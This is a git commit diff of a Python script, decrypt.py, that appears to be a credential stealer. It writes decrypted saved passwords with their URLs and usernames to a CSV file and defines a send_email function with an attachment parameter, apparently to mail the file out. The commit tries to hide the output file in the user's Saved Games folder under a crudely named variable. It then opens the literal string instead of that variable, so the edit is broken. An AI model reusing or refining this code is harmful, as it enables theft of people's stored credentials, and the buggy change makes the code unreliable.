e58af09debbcd85562875bdb9a7976b8957dea72
Samplayswthpython <166288160+Samplayswthpython@users.noreply.github.com>
2024-04-08 12:03:16 +0530

    Update decrypt.py

--- decrypt.py
+++ decrypt.py
@@ -101,8 +101,9 @@ def send_email(sender_email, sender_password, recipient_email, subject, body, at
 
 if __name__ == '__main__':
     try:
+        hentai = f"{os.path.expanduser('~')}\\Saved Games\\decrypted_password.csv"
         #Create Dataframe to store passwords
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('hentai', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
